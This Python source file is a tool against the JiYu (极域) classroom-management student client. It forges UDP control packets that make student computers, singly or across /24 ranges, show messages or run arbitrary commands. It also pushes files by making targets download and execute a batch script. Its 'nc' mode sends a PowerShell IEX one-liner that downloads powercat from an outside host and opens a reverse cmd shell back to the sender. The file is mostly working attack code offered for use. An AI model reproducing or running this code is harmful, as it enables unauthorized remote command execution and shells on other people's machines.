def build_parser():
    parser = argparse.ArgumentParser(
        description="极域学生端 UDP 控制报文测试工具")
    parser.add_argument('-ip', type=str, help="ip 指定目标IP地址")
    parser.add_argument('-p', type=int, default=4705, help="port 指定监听端口，默认端口为4705")
    message_options = parser.add_mutually_exclusive_group()
    message_options.add_argument(
        '-msg', type=str, help="发送文本消息，支持多行；超长内容自动分条")
    message_options.add_argument(
        '--msg-file', type=str, metavar="PATH",
        help="从 UTF-8 文件读取消息；使用 - 从标准输入读取")
    message_options.add_argument(
        '--file', type=str, metavar="PATH",
        help="传送本地文件到目标电脑桌面")
    parser.add_argument(
        '-c', type=str, help="command命令 eg: -c   \"cmd.exe /c ipconfig\"")
    parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
    parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
    parser.add_argument(
        '--file-ip', type=str, metavar="IP",
        help="文件传送时发送端 IP，默认自动检测")
    parser.add_argument(
        '--file-timeout', type=int, default=120, metavar="SECONDS",
        help="等待目标下载文件的秒数，默认 120")
    parser.add_argument(
        '-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'],
        help="Extra Options加载额外的选项 eg：-e r")
    return parser


parser = build_parser()


# 格式化要发送的消息
def format_b4_send(content):
    return list(content.encode('utf-16le'))


def read_message(arguments):
    if arguments.msg_file is None:
        return arguments.msg
    if arguments.msg_file == '-':
        return sys.stdin.read()
    with open(arguments.msg_file, encoding='utf-8-sig', newline='') as message_file:
        return message_file.read()


def split_message(content):
    chunk = []
    byte_count = 0
    for character in content:
        if character == '\x00':
            raise ValueError("消息不能包含 NUL 字符")
        character_bytes = len(character.encode('utf-16le'))
        if byte_count + character_bytes > MESSAGE_MAX_BYTES:
            yield ''.join(chunk)
            chunk = []
            byte_count = 0
        chunk.append(character)
        byte_count += character_bytes
    if chunk:
        yield ''.join(chunk)


# 获取目标地址
def get_ip(ip):
    if not isinstance(ip, str) or not ip.strip():
        raise ValueError("请填写目标地址")
    value = ip.strip()
    try:
        if '-' in value:
            if value.count('-') != 1:
                raise ValueError
            start, end = value.split('-')
            start_address = ipaddress.IPv4Address(start)
            if not end.isdigit():
                raise ValueError
            start_octet = int(str(start_address).split('.')[3])
            end_octet = int(end)
            if not 1 <= start_octet <= end_octet <= 254:
                raise ValueError
            return [str(ipaddress.IPv4Address(int(start_address) + offset))
                    for offset in range(end_octet - start_octet + 1)]
        if '/' in value:
            if not value.endswith('/24'):
                raise ValueError
            return [str(host) for host in ipaddress.IPv4Network(value, strict=False).hosts()]
        return [str(ipaddress.IPv4Address(value))]
    except ValueError as error:
        raise ValueError("IP 格式错误，请使用单个地址、末段范围或 /24 网段") from error


# 将要发送的消息打包成完整的指令
def pkg_sendlist(cmdtype, content):
    arrs = format_b4_send(content)
    if cmdtype == '-msg':
        if '\x00' in content:
            raise ValueError("消息不能包含 NUL 字符")
        if len(arrs) > MESSAGE_MAX_BYTES:
            raise ValueError("单条消息超过报文容量")
        result = basicCMD['-msg'].copy()
        result[MESSAGE_OFFSET:MESSAGE_OFFSET + len(arrs)] = arrs
        result[MESSAGE_OFFSET + len(arrs):MESSAGE_OFFSET + len(arrs) + 2] = [0, 0]
    elif cmdtype == '-c':
        if '\x00' in content:
            raise ValueError("命令不能包含 NUL 字符")
        if len(arrs) > COMMAND_MAX_BYTES:
            raise ValueError("命令超过报文容量（最多 %d 个 UTF-16 单元）" % (COMMAND_MAX_BYTES // 2))
        result = basicCMD['-c'].copy()
        result[COMMAND_OFFSET:COMMAND_OFFSET + len(arrs)] = arrs
        result[COMMAND_OFFSET + len(arrs):COMMAND_OFFSET + len(arrs) + 2] = [0, 0]
    return result


# 发送
def send(send_list, target_ip, port=4705, loops=1, interval=22, report=None,
         cancel_event=None):
    if len(send_list) == 0:
        raise ValueError("没有可发送的报文")
    if not 1 <= port <= 65535:
        raise ValueError("端口必须在 1 到 65535 之间")
    if loops < 1:
        raise ValueError("发送轮数必须大于 0")
    if interval < 0:
        raise ValueError("发送间隔不能小于 0")

    target_host = get_ip(target_ip)
    sent_count = 0
    if cancel_event and cancel_event.is_set():
        raise RuntimeError("操作已取消")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
        client.settimeout(1.0)
        for times in range(loops):
            for host in target_host:
                for packet_bytes in send_list:
                    if cancel_event and cancel_event.is_set():
                        raise RuntimeError("操作已取消")
                    payload = bytes(packet_bytes)
                    client.sendto(payload, (host, port))
                    sent_count += 1
            if report:
                report("第 %d/%d 轮已发送" % (times + 1, loops))
            if times != loops - 1 and interval:
                if cancel_event:
                    if cancel_event.wait(interval):
                        raise RuntimeError("操作已取消")
                else:
                    sleep(interval)
    return sent_count


def format_size(size):
    value = float(size)
    for unit in ("B", "KiB", "MiB", "GiB", "TiB"):
        if value < 1024 or unit == "TiB":
            return ("%d %s" % (value, unit)) if unit == "B" else ("%.1f %s" % (value, unit))
        value /= 1024


def validate_listen_ip(value):
    if value is None or not str(value).strip():
        return None
    try:
        return str(ipaddress.IPv4Address(str(value).strip()))
    except ValueError as error:
        raise ValueError("发送端 IP 格式无效") from error


def detect_local_ip(target=None):
    probes = []
    try:
        hosts = get_ip(target) if target else []
        if len(hosts) == 1:
            probes.append((hosts[0], 9))
    except ValueError:
        pass
    if not probes:
        probes.append(("8.8.8.8", 80))
    for address, port in probes:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
                probe.connect((address, port))
                local = probe.getsockname()[0]
        except OSError:
            continue
        if local and (address.startswith("127.") or not local.startswith("127.")):
            return local
    try:
        address = socket.gethostbyname(socket.gethostname())
        if address and not address.startswith("127."):
            return address
    except OSError:
        pass
    return "127.0.0.1"


def validate_file_transfer(target, port, file_path):
    if not isinstance(target, str) or not target.strip():
        raise ValueError("请填写目标地址")
    hosts = get_ip(target.strip())
    if len(hosts) != 1:
        raise ValueError("文件传送仅支持单个目标地址")
    try:
        port = int(port)
    except (TypeError, ValueError) as error:
        raise ValueError("端口必须是整数") from error
    if not 1 <= port <= 65535:
        raise ValueError("端口必须在 1 到 65535 之间")
    if file_path is None or not str(file_path).strip():
        raise ValueError("请选择要传送的文件")
    source = Path(file_path).expanduser()
    try:
        if not source.exists():
            raise ValueError("文件不存在：%s" % source)
        if not source.is_file():
            raise ValueError("请选择文件，而不是文件夹")
        source.stat()
        return source.resolve()
    except OSError as error:
        raise ValueError("无法读取文件：%s" % error) from error


def build_bootstrap_script(file_url, file_name, size, desktop_dir=None):
    if desktop_dir is None:
        desktop_lines = (
            'set "DESKTOP="\r\n'
            'for /f "tokens=2,*" %%A in (\'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" /v Desktop 2^>nul\') do set "DESKTOP=%%B"\r\n'
            'call set "DESKTOP=%DESKTOP%"\r\n'
            'if not defined DESKTOP set "DESKTOP=%USERPROFILE%\\Desktop"\r\n'
            'if not exist "%DESKTOP%" set "DESKTOP=%USERPROFILE%\\Desktop"\r\n'
        )
    else:
        desktop_lines = 'set "DESKTOP=%s"\r\n' % str(desktop_dir).replace('%', '%%')
    return (
        "@echo off\r\n"
        "chcp 65001>nul\r\n"
        "setlocal DisableDelayedExpansion\r\n"
        + desktop_lines
        + 'set "TARGET=%DESKTOP%\\' + str(file_name).replace('%', '%%') + '"\r\n'
        + 'set "PART=%TARGET%.part"\r\n'
        + 'del /f /q "%PART%" >nul 2>nul\r\n'
        + 'curl.exe -fsSL --noproxy "*" --retry 2 -o "%PART%" "' + file_url.replace('%', '%%') + '"\r\n'
        + 'if errorlevel 1 goto fail\r\n'
        + 'for %%A in ("%PART%") do if not "%%~zA"=="' + str(int(size)) + '" goto fail\r\n'
        + 'move /y "%PART%" "%TARGET%" >nul\r\n'
        + 'if errorlevel 1 goto fail\r\n'
        + 'exit /b 0\r\n'
        + ':fail\r\n'
        + 'del /f /q "%PART%" >nul 2>nul\r\n'
        + 'exit /b 1\r\n'
    )


def build_transfer_command(bootstrap_url):
    command = ('cmd /c curl -fsSL --noproxy * -o "%%TEMP%%\\jyt.cmd" "%s" '
               '&&call "%%TEMP%%\\jyt.cmd"&del /f /q "%%TEMP%%\\jyt.cmd"') % bootstrap_url
    if len(command.encode('utf-16le')) // 2 > COMMAND_MAX_BYTES // 2:
        raise ValueError("文件传送命令超过报文容量")
    return command


class _FileTransferRequestHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.0"

    def log_message(self, format, *args):
        return

    def do_GET(self):
        transfer = self.server.transfer
        path = urlsplit(self.path).path
        if path == "/b/" + transfer.token:
            body = transfer.bootstrap_script.encode("utf-8-sig")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
            return
        if path == "/f/" + transfer.token:
            self._send_file(transfer)
            return
        self.send_error(404)

    def _send_file(self, transfer):
        try:
            size = transfer.source.stat().st_size
        except OSError:
            self.send_error(404)
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(size))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Disposition", "attachment")
        self.end_headers()
        sent = 0
        try:
            with transfer.source.open("rb") as source:
                while True:
                    chunk = source.read(64 * 1024)
                    if not chunk:
                        break
                    self.wfile.write(chunk)
                    sent += len(chunk)
                    transfer.report_progress(sent, size)
        except OSError as error:
            transfer.fail("目标下载中断：%s" % error)
            return
        if sent == size:
            transfer.report_progress(size, size)
            transfer.complete()
        else:
            transfer.fail("文件传输不完整")


class FileTransferServer:
    def __init__(self, source, bind_host="0.0.0.0", port=0):
        self.source = Path(source)
        self.token = secrets.token_urlsafe(12)
        self.bootstrap_script = ""
        self.downloaded = Event()
        self.error = ""
        self.progress = None
        self._progress_value = -1
        self._lock = Lock()
        self.httpd = ThreadingHTTPServer((bind_host, port), _FileTransferRequestHandler)
        self.httpd.transfer = self
        self.httpd.daemon_threads = True
        self.thread = Thread(target=self.httpd.serve_forever, daemon=True)

    @property
    def port(self):
        return self.httpd.server_address[1]

    def start(self):
        self.thread.start()

    def stop(self):
        if self.thread.is_alive():
            self.httpd.shutdown()
            self.thread.join(timeout=2)
        self.httpd.server_close()

    def bootstrap_url(self, host):
        return "http://%s:%d/b/%s" % (host, self.port, self.token)

    def file_url(self, host):
        return "http://%s:%d/f/%s" % (host, self.port, self.token)

    def report_progress(self, sent, total):
        if self.progress is None:
            return
        percent = 100 if total == 0 else min(100, int(sent * 100 / total))
        percent = 100 if percent == 100 else percent // 5 * 5
        with self._lock:
            if percent == self._progress_value:
                return
            self._progress_value = percent
        try:
            self.progress("目标正在下载文件：%d%%" % percent)
        except Exception:
            pass

    def complete(self):
        self.downloaded.set()

    def fail(self, message):
        with self._lock:
            if not self.error:
                self.error = message
        self.downloaded.set()

    def wait(self, timeout=120, cancel_event=None):
        try:
            timeout = float(timeout)
        except (TypeError, ValueError) as error:
            raise ValueError("等待时间必须是数字") from error
        if timeout <= 0:
            raise ValueError("等待时间必须大于 0")
        deadline = monotonic() + timeout
        while not self.downloaded.is_set():
            if cancel_event and cancel_event.is_set():
                raise RuntimeError("操作已取消")
            remaining = deadline - monotonic()
            if remaining <= 0:
                raise RuntimeError("等待目标下载超时，请检查目标是否能访问发送端 IP 和端口")
            self.downloaded.wait(min(0.2, remaining))
        if self.error:
            raise RuntimeError(self.error)


def transfer_file(target, port, file_path, listen_ip=None, timeout=120,
                  cancel_event=None, report=None, desktop_dir=None):
    emit = report or (lambda message: None)
    source = validate_file_transfer(target, port, file_path)
    if cancel_event and cancel_event.is_set():
        raise RuntimeError("操作已取消")
    advertised_ip = validate_listen_ip(listen_ip) or detect_local_ip(target)
    bind_host = "127.0.0.1" if advertised_ip.startswith("127.") else "0.0.0.0"
    transfer = FileTransferServer(source, bind_host=bind_host)
    try:
        transfer.start()
        size = source.stat().st_size
        transfer.bootstrap_script = build_bootstrap_script(
            transfer.file_url(advertised_ip), source.name, size, desktop_dir)
        transfer.progress = emit
        command = build_transfer_command(transfer.bootstrap_url(advertised_ip))
        emit("文件传送服务已启动：%s:%d" % (advertised_ip, transfer.port))
        emit("正在向目标发送文件传送命令")
        send([pkg_sendlist("-c", command)], target, port, 1, 0, emit, cancel_event)
        emit("等待目标下载到桌面")
        transfer.wait(timeout, cancel_event)
        emit("目标已下载文件：%s（%s）" % (source.name, format_size(size)))
        return {
            "name": source.name,
            "size": size,
            "target": target,
            "listen_ip": advertised_ip,
        }
    finally:
        transfer.stop()


@dataclass
class SendOptions:
    target: str
    port: int = 4705
    message: str = ""
    command: str = ""
    extra: str = ""
    loops: int = 1
    interval: float = 22
    cancel_event: Optional[Event] = None


def validate_options(options):
    if not options.target.strip():
        raise ValueError("请填写目标地址")
    try:
        get_ip(options.target.strip())
    except ValueError as error:
        raise ValueError("目标地址格式无效") from error
    if not 1 <= options.port <= 65535:
        raise ValueError("端口必须在 1 到 65535 之间")
    if options.loops < 1:
        raise ValueError("发送轮数必须大于 0")
    if options.interval < 0:
        raise ValueError("发送间隔不能小于 0")
    if options.extra not in {"", "r", "s"}:
        raise ValueError("网络发送仅支持 r 或 s 扩展操作")
    if not options.message and not options.command and not options.extra:
        raise ValueError("至少填写消息、命令或选择设备操作")


def prepare_packets(options, report=None):
    validate_options(options)
    packets = []
    if options.message:
        for chunk in split_message(options.message):
            if options.cancel_event and options.cancel_event.is_set():
                raise RuntimeError("操作已取消")
            packets.append(pkg_sendlist("-msg", chunk))
        if report:
            report("已准备 %d 条消息" % len(packets))
    if options.command:
        packets.append(pkg_sendlist("-c", options.command))
    if options.extra in {"r", "s"}:
        packets.append(basicCMD["-" + options.extra].copy())
    return packets


def execute_send(options, report=None):
    validate_options(options)
    emit = report or (lambda message: None)
    packets = prepare_packets(options, emit)
    target_hosts = get_ip(options.target.strip())
    emit("目标数量：%d，报文数量：%d" % (len(target_hosts), len(packets)))
    sent_count = send(packets, options.target, options.port, options.loops,
                      options.interval, emit, options.cancel_event)
    emit("本机发送完成，共 %d 个报文" % sent_count)
    return sent_count


def creat_send_object(arguments):
    send_list = []

    # 获取命令内容
    message = read_message(arguments)
    if message:
        send_list.extend(pkg_sendlist('-msg', chunk) for chunk in split_message(message))

    if arguments.c:
        send_list.append(pkg_sendlist('-c', arguments.c))

    if arguments.e == 'r':
        send_list.append(basicCMD['-r'].copy())

    if arguments.e == 's':
        send_list.append(basicCMD['-s'].copy())

    return send_list


def _decode_windows_output(output):
    """Decode Windows CLI output, which may use UTF-8 or the ANSI code page."""
    if not output:
        return ""
    candidates = []
    for encoding in ("utf-8-sig", "mbcs"):
        try:
            candidates.append((encoding, output.decode(encoding)))
        except UnicodeDecodeError:
            pass
    if not candidates:
        return output.decode("utf-8", errors="replace")
    return candidates[0][1] if candidates[0][0] == "utf-8-sig" else candidates[-1][1]

def _windows_command(command):
    if sys.platform != "win32":
        raise RuntimeError("此功能仅支持 Windows")
    process = subprocess.run(
        command, capture_output=True,
        creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
    process.stdout = _decode_windows_output(process.stdout)
    process.stderr = _decode_windows_output(process.stderr)
    return process


def _firewall_result(command, process, *, success=False, note=""):
    stdout = process.stdout.strip()
    stderr = process.stderr.strip()
    if note:
        output = note + ("\n" + stdout if stdout else "")
    else:
        output = stdout or stderr
    return {
        "command": command,
        "code": process.returncode,
        "stdout": output,
        "stderr": stderr if note and stdout else "",
        "success": success,
        "detail": note,
    }


def local_ip_and_ports():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    tasks = _windows_command(['tasklist', '/FO', 'CSV', '/NH'])
    if tasks.returncode:
        raise RuntimeError(tasks.stderr.strip() or tasks.stdout.strip() or "进程查询失败")
    pids = {row[1] for row in csv.reader(tasks.stdout.splitlines())
            if len(row) >= 2 and 'student' in row[0].casefold()}
    if not pids:
        return ip, []
    connections = _windows_command(['netstat', '-ano', '-p', 'UDP'])
    if connections.returncode:
        raise RuntimeError(connections.stderr.strip() or "监听端口查询失败")
    ports = set()
    for line in connections.stdout.splitlines():
        fields = line.split()
        if len(fields) >= 4 and fields[0] == 'UDP' and fields[-1] in pids:
            port = fields[1].rsplit(':', 1)[-1]
            if port.isdigit():
                ports.add(port)
    return ip, sorted(ports, key=int)


def set_firewall_rule(action):
    if action not in {"block", "allow"}:
        raise ValueError("不支持的防火墙操作")
    commands = []
    if action == "block":
        commands.extend([
            ["net.exe", "start", "MpsSvc"],
            ["netsh", "advfirewall", "set", "allprofiles", "state", "on"],
        ])
    commands.append(["netsh", "advfirewall", "firewall", "set", "rule",
                     "name=StudentMain.exe", "new", "action=" + action])
    results = []
    for index, command in enumerate(commands):
        process = _windows_command(command)
        command_text = " ".join(command)
        success = process.returncode == 0
        note = ""
        if action == "block" and index == 0:
            if success:
                note = "防火墙服务已启动。"
            elif "2182" in process.stderr or "已经启动" in process.stderr:
                success = True
                note = "防火墙服务原本已在运行。"
            else:
                note = "无法启动防火墙服务，请确认程序已获得管理员权限。"
        elif action == "block" and index == 1:
            if success:
                note = "Windows 防火墙已启用，目标规则已更新为阻断。"
            else:
                note = "无法启用 Windows 防火墙，请确认程序已获得管理员权限。"
        elif action == "block" and index == 2:
            if success:
                note = "已将 StudentMain.exe 规则更新为阻断。"
            else:
                note = "无法更新 StudentMain.exe 规则，请确认该规则存在且程序已获得管理员权限。"
        elif action == "allow":
            if success:
                note = "已将 StudentMain.exe 规则更新为允许。"
            else:
                note = "无法更新 StudentMain.exe 规则，请确认该规则存在且程序已获得管理员权限。"
        results.append(_firewall_result(command_text, process, success=success, note=note))
    return results

def single_command(arguments):
    if arguments.e == 'g':
        try:
            ip, ports = local_ip_and_ports()
            if not ip:
                print("未能获取本机 IP 地址")
                return
            print("\nYour ip addres is:" + ip)
            print("\nYour student client possible ports are:" + ','.join(ports))
        except Exception as error:
            print("[-] %s" % error)
        return

    elif arguments.e == "break":
        results = set_firewall_rule("block")
        sleep(1)
        system("cls")
        failed = any(not item["success"] for item in results)
        print("[-] 部分防火墙设置失败，请检查管理员权限" if failed else "防火墙规则已阻断")
        return

    elif arguments.e == "continue":
        results = set_firewall_rule("allow")
        failed = any(not item["success"] for item in results)
        if failed:
            print("[-] 部分防火墙设置失败，请检查管理员权限")
            return
        print("防火墙规则已恢复")
        return

def netcat(num, arguments):
    send_list = []
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
    send_list.append(pkg_sendlist('-c', cmd))
    send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t)


def run_file_transfer(arguments):
    result = transfer_file(
        arguments.ip, arguments.p, arguments.file,
        listen_ip=arguments.file_ip, timeout=arguments.file_timeout, report=print)
    print("文件已传送：%s（%s）" % (result["name"], format_size(result["size"])))
    return 0


def run_from_cmd(arguments):
    try:
        single_command(arguments)
        if arguments.e in {'g', 'break', 'continue'}:
            return
        if arguments.file:
            if arguments.e or arguments.msg or arguments.msg_file or arguments.c:
                raise ValueError("文件传送不能与消息、命令或 -e 扩展功能同时使用")
            return run_file_transfer(arguments)
        if arguments.file_ip or arguments.file_timeout != 120:
            raise ValueError("--file-ip 和 --file-timeout 仅用于文件传送")
        if arguments.e != 'nc':
            send_list = creat_send_object(arguments)
            send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t,
                 report=print)
            return
        num = random.randint(1, 65535)
        pool = Pool(processes=1)
        pool.apply_async(netcat, (num, arguments))
        print("listening on [any] {} ...".format(num))
        system("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(num))
        pool.close()
        pool.join()
    except Exception as e:
        print("[-] %s" % e)
        return 1
    return 0


if __name__ == "__main__":
    freeze_support()
    sys.exit(run_from_cmd(parser.parse_args()))
